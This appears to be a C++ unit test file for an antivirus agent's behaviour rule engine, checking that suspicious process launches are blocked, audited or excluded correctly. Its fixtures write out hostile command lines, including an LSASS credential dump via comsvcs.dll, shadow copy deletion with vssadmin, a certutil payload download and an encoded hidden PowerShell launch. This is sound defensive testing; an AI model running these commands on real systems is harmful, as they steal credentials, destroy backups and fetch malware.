// Unit tests for the process-start rule engine. Portable: g++ on Linux, or MinGW/MSVC.
#include <cstdio>
#include <cstdlib>
#include <string>

#include "BehaviorRules.h"

using namespace antivirus::agent::behavior;

static int failures = 0;
#define CHECK(cond)                                                    \
  do {                                                                 \
    if (!(cond)) {                                                     \
      std::printf("FAIL %s:%d %s\n", __FILE__, __LINE__, #cond);       \
      ++failures;                                                      \
    }                                                                  \
  } while (0)

static BehaviorPolicy BlockAll() {
  BehaviorPolicy p;
  for (const auto* key : {L"blockOfficeChildProcesses", L"blockObfuscatedScripts", L"blockScriptDownloadedPayloads",
                          L"blockEmailExecutables", L"blockCredentialStealingLsass", L"blockPsexecWmiProcessCreation",
                          L"blockUntrustedUsbProcesses", L"blockWmiPersistence", L"blockVulnerableSignedDrivers",
                          L"blockLolbinAbuse", L"blockAdobeReaderChildProcesses", L"blockWebshellCreation",
                          L"advancedRansomwareProtection"}) {
    p.asr[key] = RuleMode::Block;
  }
  p.agentInstallRoot = L"C:\\Program Files\\Fenrir";
  return p;
}

static bool Fired(const std::vector<Decision>& d, const std::wstring& rule) {
  for (const auto& x : d)
    if (x.rule == rule) return true;
  return false;
}

int main() {
  const auto policy = BlockAll();
  {  // Word spawning PowerShell
    ProcessFacts p{.imagePath = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                   .commandLine = L"powershell -nop -w hidden -enc SQBFAFgA",
                   .parentImagePath = L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"};
    const auto d = Evaluate(p, policy);
    CHECK(Fired(d, L"attackSurface.blockOfficeChildProcesses"));
    CHECK(Fired(d, L"attackSurface.blockObfuscatedScripts"));
    CHECK(Strongest(d) == RuleMode::Block);
  }
  {  // Benign: Explorer starting Word
    ProcessFacts p{.imagePath = L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                   .commandLine = L"WINWORD.EXE /n report.docx", .parentImagePath = L"C:\\Windows\\explorer.exe",
                   .signer = L"Microsoft Corporation", .signatureVerified = true};
    CHECK(Evaluate(p, policy).empty());
  }
  {  // LSASS dump via comsvcs
    ProcessFacts p{.imagePath = L"C:\\Windows\\System32\\rundll32.exe",
                   .commandLine = L"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\t\\l.dmp full"};
    CHECK(Fired(Evaluate(p, policy), L"attackSurface.blockCredentialStealingLsass"));
  }
  {  // Shadow copy deletion is blocked by the ransomware setting even with ASR off
    BehaviorPolicy off;
    ProcessFacts p{.imagePath = L"C:\\Windows\\System32\\vssadmin.exe", .commandLine = L"vssadmin delete shadows /all /quiet"};
    const auto d = Evaluate(p, off);
    CHECK(Fired(d, L"ransomware.blockShadowCopyDeletion"));
    CHECK(!Fired(d, L"attackSurface.advancedRansomwareProtection"));
    off.blockShadowCopyDeletion = false;
    CHECK(Evaluate(p, off).empty());
  }
  {  // Audit mode records but does not block
    BehaviorPolicy audit;
    audit.asr[L"blockLolbinAbuse"] = RuleMode::Audit;
    ProcessFacts p{.imagePath = L"C:\\Windows\\System32\\certutil.exe",
                   .commandLine = L"certutil -urlcache -split -f http://x/a.exe a.exe"};
    const auto d = Evaluate(p, audit);
    CHECK(Fired(d, L"attackSurface.blockLolbinAbuse"));
    CHECK(Strongest(d) == RuleMode::Audit);
  }
  {  // Web server spawning a shell
    ProcessFacts p{.imagePath = L"C:\\Windows\\System32\\cmd.exe", .commandLine = L"cmd /c whoami",
                   .parentImagePath = L"C:\\Windows\\System32\\inetsrv\\w3wp.exe"};
    CHECK(Fired(Evaluate(p, policy), L"attackSurface.blockWebshellCreation"));
  }
  {  // Our own agent is never blocked
    ProcessFacts p{.imagePath = L"C:\\Program Files\\Fenrir\\fenrir-agent-service.exe", .commandLine = L"-enc AAAA",
                   .parentImagePath = L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"};
    CHECK(Evaluate(p, policy).empty());
  }
  {  // Exclusions by process name
    auto excluded = policy;
    excluded.excludedProcesses = {L"certutil.exe"};
    ProcessFacts p{.imagePath = L"C:\\Windows\\System32\\certutil.exe", .commandLine = L"certutil -urlcache -f http://x/a"};
    CHECK(Evaluate(p, excluded).empty());
  }
  {  // Application control: deny list by name, hash and signer
    BehaviorPolicy app;
    app.appControlMode = L"enforce-denylist";
    app.blockedApps = {L"anydesk.exe", L"ABCDEF", L"Evil Signer Ltd"};
    CHECK(Fired(Evaluate({.imagePath = L"C:\\Users\\a\\Downloads\\AnyDesk.exe"}, app), L"applicationControl.blockedApps"));
    CHECK(Fired(Evaluate({.imagePath = L"C:\\x\\tool.exe", .sha256 = L"abcdef"}, app), L"applicationControl.blockedApps"));
    CHECK(Fired(Evaluate({.imagePath = L"C:\\x\\t.exe", .signer = L"evil signer ltd", .signatureVerified = true}, app),
                L"applicationControl.blockedApps"));
    CHECK(Evaluate({.imagePath = L"C:\\x\\notepad.exe"}, app).empty());
    app.appControlMode = L"audit";
    CHECK(Strongest(Evaluate({.imagePath = L"C:\\x\\anydesk.exe"}, app)) == RuleMode::Audit);
  }
  {  // Application control: allow list
    BehaviorPolicy app;
    app.appControlMode = L"enforce-allowlist";
    app.allowedPublishers = {L"Contoso Ltd"};
    app.allowedHashes = {L"1234"};
    CHECK(Evaluate({.imagePath = L"C:\\Windows\\System32\\notepad.exe", .signer = L"Microsoft Windows", .signatureVerified = true}, app)
              .empty());
    CHECK(Evaluate({.imagePath = L"D:\\apps\\crm.exe", .signer = L"Contoso Ltd", .signatureVerified = true}, app).empty());
    CHECK(Evaluate({.imagePath = L"D:\\apps\\tool.exe", .sha256 = L"1234"}, app).empty());
    CHECK(Fired(Evaluate({.imagePath = L"D:\\apps\\game.exe"}, app), L"applicationControl.allowlist"));
    // Unsigned copy dropped into C:\Windows is not trusted just by location.
    CHECK(Fired(Evaluate({.imagePath = L"C:\\Windows\\Temp\\x.exe"}, app), L"applicationControl.allowlist"));
  }
  {  // Unsigned program from USB
    ProcessFacts p{.imagePath = L"E:\\setup.exe", .onRemovableMedia = true};
    CHECK(Fired(Evaluate(p, policy), L"attackSurface.blockUntrustedUsbProcesses"));
    p.signer = L"Contoso Ltd";
    p.signatureVerified = true;
    CHECK(!Fired(Evaluate(p, policy), L"attackSurface.blockUntrustedUsbProcesses"));
  }
  {  // Strict exclusions: path *and* hash of the parent, wildcard only in the file name
    CHECK(ExclusionPathMatches(L"C:\\Program Files\\Acme\\agent-*.exe", L"c:/program files/acme/AGENT-2.4.exe"));
    CHECK(!ExclusionPathMatches(L"C:\\Program Files\\Acme\\agent-*.exe", L"C:\\Users\\bob\\agent-2.4.exe"));
    CHECK(!ExclusionPathMatches(L"C:\\Program Files\\Acme\\agent.exe", L"C:\\Program Files\\Acme\\sub\\agent.exe"));
    CHECK(ExclusionPathMatches(L"C:\\Tools\\a?c.exe", L"C:\\Tools\\abc.exe"));
    ExclusionRule chain;
    chain.id = L"exc_1";
    chain.parentImage = L"C:\\Program Files\\Acme RMM\\acme-agent.exe";
    chain.parentSha256 = {std::wstring(64, L'a')};
    chain.childImage = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    chain.scopes = {L"behavior", L"sigma"};
    ProcessFacts p{.imagePath = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                   .commandLine = L"powershell -enc SQBFAFgA",
                   .parentImagePath = L"C:\\Program Files\\Acme RMM\\acme-agent.exe",
                   .parentSha256 = std::wstring(64, L'A')};
    const std::vector<ExclusionRule> rules{chain};
    CHECK(MatchExclusion(rules, L"behavior", p) != nullptr);
    CHECK(MatchExclusion(rules, L"antimalware", p) == nullptr);  // only the listed scopes
    CHECK(NeedsParentHash(rules, p.parentImagePath));
    CHECK(!NeedsParentHash(rules, L"C:\\Windows\\explorer.exe"));
    CHECK(!NeedsChildHash(rules));
    p.parentSha256 = std::wstring(64, L'b');  // replaced binary at the same path
    CHECK(MatchExclusion(rules, L"behavior", p) == nullptr);
    p.parentSha256.clear();  // hash unknown: never trusted
    CHECK(MatchExclusion(rules, L"behavior", p) == nullptr);
    ExclusionRule hash;
    hash.id = L"exc_2";
    hash.kind = L"hash";
    hash.childSha256 = {std::wstring(64, L'c')};
    hash.scopes = {L"antimalware"};
    CHECK(NeedsChildHash({hash}));
    CHECK(MatchExclusion({hash}, L"antimalware", ProcessFacts{.imagePath = L"D:\\x.exe", .sha256 = std::wstring(64, L'c')}) != nullptr);
    CHECK(MatchExclusion({hash}, L"antimalware", ProcessFacts{.imagePath = L"D:\\x.exe", .sha256 = std::wstring(64, L'd')}) == nullptr);
  }
  std::printf(failures ? "%d failure(s)\n" : "all behavior rule tests passed\n", failures);
  return failures ? 1 : 0;
}
